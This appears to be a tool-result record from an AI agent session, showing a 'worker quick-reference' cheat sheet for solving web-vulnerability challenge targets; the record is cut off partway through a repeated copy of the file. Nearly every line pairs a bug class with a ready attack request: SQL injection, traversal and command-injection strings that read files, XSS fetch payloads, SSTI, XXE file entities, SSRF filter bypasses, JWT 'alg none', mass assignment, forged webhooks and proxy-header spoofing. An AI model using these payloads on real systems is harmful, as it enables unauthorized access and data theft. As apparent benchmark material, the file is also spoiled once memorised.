{"type":"user","message":{"role":"user","content":[{"tool_use_id":"toolu_01DbfQfJpbEH6R26q6pnVk72","type":"tool_result","content":"     1\t## Recognition cues (worker quick-reference)\n     2\t\n     3\t```\n     4\tFIRST 60 SECONDS ON ANY TARGET (cheap, in parallel, curl --max-time 20 -A 'Mozilla/5.0'):\n     5\t  GET /api/clues   -> feature_route / secondary_route / current_role|current_user + ZERO or ONE concept key\n     6\t  GET each clue route BARE: the JSON error names the missing piece (session_id_required, post_required(405) = POST\n     7\t      sink, administrator_required(403), path_required, account_id_required, self_service_only; 404 not_found on a\n     8\t      GraphQL route = POST JSON instead). A *_guide_route / inventory_route JSON lists the next requests: read it.\n     9\t  GET /, /robots.txt, /openapi.json, /sitemap.xml -> links, forms, inline fetch('/api/..'), comments, Disallow\n    10\t  regex  proof_[0-9a-f]{32}  over EVERY body. An `effect` without the proof is NOT a solve (D12, D16 baseline).\n    11\t  Any file read (LFI, cmd, SSTI, XXE, file://): /run/huntress/config.json `weakness` names the class.\n    12\tPick routes by clue KEY, NEVER by the word in the value (process|execute|inspect|submit|result|audit re-dealt).\n    13\tNo concept key (D11-D13, D15) -> the prompt's verb names the bug; POST bodies: JSON first (D12 ignored form fields).\n    14\tQuery values: always --data-urlencode / %3B (Go/Gin drops a raw `;`). MASTERY: 5 targets, prompt = today's only ->\n    15\t  earlier-day handlers use their own defaults (D04 reads /run/huntress/objective.txt even with no path in the prompt).\n    16\tONE-SHOT STATE (credits/balance/remaining in a secondary, \"race\", \"twice\") -> GET only until the burst (D21).\n    17\t\n    18\tCLUE KEY / PROMPT CUE                                  -> BUG                -> FIRST REQUEST\n    19\trobots Disallow, \"backup\", \"archive\"                   -> exposed backup     -> Disallow -> index -> .bak (depth 2)\n    20\t\"Signed in as\", /api/history ids                       -> IDOR               -> foreign id into the API template\n    21\tsearch box, \"database\"                                 -> SQLi               -> q=zz') OR 1=1 --  (+ quote-balanced, ' \" )) #)\n    22\t?doc= (handbook.php/notes.php), \"stay inside\"        -> traversal          -> ../ x10 + /run/huntress/objective.txt\n    23\tfeature_route only, \"staff-only, just a sign\"          -> unprotected route  -> GET it\n    24\tcallback_nonce, \"repeats everything\"                   -> reflected XSS      -> ?q=<script>fetch('/cb?nonce=N')</script>, then GET /cb?nonce=N\n    25\t      with Sec-Fetch-Site: same-origin, Mode: cors, Dest: empty, Referer: <reflected URL>, Origin, X-Callback-Nonce\n    26\tmoderator_data_route + receipt_route_template          -> stored XSS (bot)   -> POST /api/<noun> {\"message\":\"<script>fetch(DATA,{credentials:\n    27\t  \"guestbook\", \"reviewer stops by\"                          'include'}) -> POST RCPT {evidence}</script>\"}; poll /<noun>/{id} >=30 s\n    28\tsession_hint, \"plant your session\"                     -> session fixation   -> feature?sid=<hint>, then secondary with arena_session=<hint>\n    29\tpreferences_route, hidden csrf_token, \"even strangers\" -> CSRF (D09)         -> external option with Sec-Fetch-Site: cross-site, Mode: navigate,\n    30\t                                                                                Dest: document, foreign Referer; GET /api/preferences\n    31\tupload_shape/render_route, \"standards. Low ones\"       -> upload (D10)       -> POST JSON {filename:\"n.html\",content:\"<p>{{objective}}</p>\",\n    32\t                                                                                content_type:\"text/html\"} -> GET the returned path\n    33\t\"evaluates everything\", empty \"Rendered message\" <pre> -> SSTI (D11)         -> ?template=a${7*7}b{{7*7}}c per param -> {{objective}}\n    34\t\"plant ... come back later\", post_required + rows:[]   -> 2nd-order SQLi     -> POST JSON {every field: \"x' OR '1'='1' -- \"}, GET secondary\n    35\t\"API binds whatever you hand it\", administrator_required -> mass assignment  -> POST JSON {display_name, role:\"admin\", is_admin, isAdmin,\n    36\t                                                                                admin, roles:[\"admin\"], access_level, permissions}; GET secondary\n    37\tinventory_route + protected_reference                  -> field/action authz -> feature?id=<protected>&fields=<f>&action=<a>, EVERY single f x a\n    38\t\"fetch anything you point it at\", absolute_url_required -> SSRF (D15)        -> feature?url=http://127.0.0.1:8080<secondary>; ladder :80 :5000 ..\n    39\t  + secondary internal_only\n    40\tinput_parameter + example_path, \"too close to a real   -> cmd injection(D16) -> feature?<param>=<example>%3Bcat%20/run/huntress/objective.txt\n    41\t  shell\", 400 path_required, JSON stdout                                        -> stdout line 2 (then %0a, &&, |, $() if ; is filtered)\n    42\trecovery_guide_route, \"Forgot your password ...        -> reset token (D17)  -> GET guide; request_route?account_id=<self_service id> -> token;\n    43\t  somebody else's account\", self_service_only                                   redeem_route?token=<it>&account_id=<other id> -> evidence\n    44\tprotected_reference + note \"checked by each resolver\", -> GraphQL (D18)      -> POST JSON {\"query\":\"{__schema{..}}\"}; then {caseIndex{id title\n    45\t  \"Discover the schema\", GET 404 not_found                                      visibility} case(id:\"<prot>\"){id title note}} -> note\n    46\tevent_type + owner_scope (values), \"believes every      -> forged webhook(D19)-> POST JSON {event_type,type,event: <ev>, owner_scope,scope,owner: <scope>,\n    47\t  event\", 405 post_required, webhook_rejected                                   role,current_role:\"admin\", source,sender:\"provider\", verified,signed,trusted:true}\n    48\tstate_format_route, \"sign nothing\", state_required    -> unsigned state(D20)-> GET guide; POST {<field>: b64url(sample, role=\"administrator\")} to `transport`\n    49\t\"One credit, two purchases ... race it\", secondary 403  -> race (D21)         -> NO sequential POST; 24 concurrent POST {} to feature on a barrier,\n    50\t  credit_not_overspent + credits, 409 credit_unavailable                        then GET secondary (UNSOLVED: success shape unknown)\n    51\tstream_reference, 426 websocket_upgrade_required,      -> WS stream (D22)    -> WS handshake to feature?stream=<ref> WITH Origin: <target> (none = 403);\n    52\t  \"upgraded to websockets ... never meant for you\"                              proof in the first server text frame (stdlib socket+ssl client)\n    53\tdeployment: trusted_reverse_proxy, 403 loopback_only   -> proxy header (D23) -> GET feature with X-Forwarded-For: 127.0.0.1 (then X-Real-IP, Forwarded:\n    54\t  + evaluated_client, \"whatever the proxy whispers\"                             for=, X-Client-IP, True-Client-IP); evaluated_client must flip\n    55\tcurrent_role / role cookie / X-*-Role                  -> role tampering     -> set the named value to administrator/admin (cookie, header, claim)\n    56\teyJ..eyJ..sig in cookie/Authorization, blob + .sig     -> JWT / signed state -> alg none / leaked secret / re-sign; then the role ladder\n    57\totp/verify/step 2, \"second factor\", \"remember me\"      -> MFA step skip      -> call the final step with the step-1 session; omit/reuse the code\n    58\tlocation.hash/search -> innerHTML/eval in inline JS    -> DOM XSS            -> payload in #fragment; bot or callback check\n    59\t?next=/?return=/redirect_uri                           -> open redirect      -> point it at the clue route / //other-host\n    60\tSSRF filtered (blocked_host) -> 2130706433, 127.1, [::1], allowed@127.0.0.1, file:///run/...; Host/X-Forwarded-Host in links -> poison\n    61\t/api/v1 vs /v2, \"legacy\", \"beta\"; EventSource/socket.io -> shadow API / SSE  -> the protected op on every version / transport (same authz?)\n    62\tXML/SVG/DOCX upload -> XXE <!ENTITY x SYSTEM \"file:///run/huntress/objective.txt\">. \"__proto__\"/JSON merge -> {\"__proto__\":{\"isAdmin\":true}}\n    63\tGeneric rejection naming no field (webhook_rejected) -> ONE alias-union JSON body first (D19). Real bot only on \"reviewer visits\" (D07).\n    64\tNEW CLASS = write lib/web/handlers/dayNN_*.py (KEY_MAP + HANDLERS) BEFORE the single submit (D11, D19, D20, D23 -> TT\n    65\tfirst try; D09-D10, D12-D13, D15-D18, D22 TT solver_incomplete). Banners are costume; the title pun names the bug.\n    66\t```\n    67","is_error":false}]},"parent_tool_use_id":null,"session_id":"c0bf25a0-cb46-44e8-a6ad-aa115823f759","uuid":"8127551b-bbcc-464f-bd22-453f6a1d454d","timestamp":"2026-10-27T13:11:24.298Z","tool_use_result":{"stdout":"     1\t## Recognition cues (worker quick-reference)\n     2\t\n     3\t```\n     4\tFIRST 60 SECONDS ON ANY TARGET (cheap, in parallel, curl --max-time 20 -A 'Mozilla/5.0'):\n     5\t  GET /api/clues   -> feature_route / secondary_route / current_role|current_user + ZERO or ONE concept key\n     6\t  GET each clue route BARE: the JSON error names the missing piece (session_id_required, post_required(405) = POST\n     7\t      sink, administrator_required(403), path_required, account_id_required, self_service_only; 404 not_found on a\n     8\t      GraphQL route = POST JSON instead). A *_guide_route / inventory_route JSON lists the next requests: read it.\n     9\t  GET /, /robots.txt, /openapi.json, /sitemap.xml -> links, forms, inline fetch('/api/..'), comments, Disallow\n    10\t  regex  proof_[0-9a-f]{32}  over EVERY body. An `effect` without the proof is NOT a solve (D12, D16 baseline).\n    11\t  Any file read (LFI, cmd, SSTI, XXE, file://): /run/huntress/config.json `weakness` names the class.\n    12\tPick routes by clue KEY, NE